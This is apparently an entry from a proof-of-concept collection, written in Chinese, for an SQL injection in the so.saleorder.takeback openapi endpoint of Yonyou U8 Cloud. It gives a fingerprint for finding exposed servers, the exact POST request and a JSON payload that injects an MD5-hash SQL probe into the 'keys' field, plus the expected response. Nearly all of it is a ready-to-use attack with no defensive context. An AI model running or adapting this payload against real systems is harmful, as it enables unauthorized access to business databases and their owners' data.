# 用友U8Cloudso.saleorder.takeback存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /u8cloud/openapi/so.saleorder.takeback?appcode=huo&isEncrypt=N HTTP/1.1`

**Payload**
```
"pk_proposer": "1",
"operator": "1",
"pk_corp": "1",
"keys": ["1'and 1=LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '554'), 2))--"]
}
```
- **响应特征**：200